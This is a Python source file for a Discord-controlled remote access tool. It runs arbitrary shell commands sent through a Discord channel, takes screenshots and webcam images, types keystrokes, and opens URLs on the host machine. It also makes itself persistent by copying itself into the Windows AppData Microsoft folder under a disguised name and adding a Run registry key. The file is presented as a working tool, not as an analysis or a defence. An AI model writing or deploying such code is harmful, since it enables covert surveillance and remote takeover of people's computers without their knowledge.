import discord
import subprocess
import os
import mss
import mss.tools
import webbrowser
import pyautogui
import cv2
import sys
import shutil
import winreg



# === CONFIGURATION ==
CHANNEL_ID = 1398934564025536573

# === DISCORD CLIENT SETUP ===
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"🖥️ Server Agent is online as {client.user}")

@client.event
async def on_message(message):
    if message.channel.id != CHANNEL_ID or message.author == client.user:
        return

    content = message.content.strip()

    if content.lower().startswith("start "):
        cmd = content[6:].strip()
        try:
            subprocess.Popen(cmd, shell=True)
            await message.channel.send(f"✅ Launched: `{cmd}`")
        except Exception as e:
            await message.channel.send(f"❌ Error: `{str(e)}`")

    elif content.lower().startswith("search "):
        url = content[7:].strip()
        try:
            webbrowser.open(url)
            await message.channel.send(f"🌐 Opened URL: `{url}`")
        except Exception as e:
            await message.channel.send(f"❌ Failed to open URL: `{str(e)}`")

    elif content.lower() == "scrn":
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                img = sct.grab(monitor)
                path = "screenshot.png"
                mss.tools.to_png(img.rgb, img.size, output=path)

            with open(path, 'rb') as f:
                await message.channel.send("📸 Screenshot captured:", file=discord.File(f))
            os.remove(path)
        except Exception as e:
            await message.channel.send(f"❌ Screenshot failed: `{str(e)}`")

    elif content.lower().startswith("type "):
        text = content[5:].strip()
        pyautogui.write(text)
        await message.channel.send(f"⌨️ Typed: `{text}`")

    elif content.lower().startswith("key "):
        key = content[4:].strip()
        pyautogui.press(key)
        await message.channel.send(f"🔑 Key pressed: `{key}`")

    elif content.lower().startswith("keycombo "):
        keys = content[9:].strip().split('+')
        pyautogui.hotkey(*keys)
        await message.channel.send(f"🎯 Key combo: `{' + '.join(keys)}`")

    elif content.lower() == "camera":
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            cam.release()
            if ret:
                img_path = "webcam.png"
                cv2.imwrite(img_path, frame)
                with open(img_path, 'rb') as f:
                    await message.channel.send("📷 Webcam capture:", file=discord.File(f))
                os.remove(img_path)
            else:
                await message.channel.send("❌ Could not access camera.")
        except Exception as e:
            await message.channel.send(f"❌ Camera error: `{str(e)}`")

# === OPTIONAL: AUTOSTART ON WINDOWS ===
def add_to_startup():
    exe_path = os.path.realpath(sys.argv[0])
    appdata_path = os.getenv("APPDATA")
    dst = os.path.join(appdata_path, "Microsoft", "masala_hub.exe")
    if not os.path.exists(dst) and exe_path.endswith(".exe"):
        shutil.copyfile(exe_path, dst)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "masala_hub", 0, winreg.REG_SZ, dst)
        key.Close()

try:
    add_to_startup()
except Exception as e:
    print(f"[Startup error] {e}")

# === START BOT ===
client.run(BOT_TOKEN)
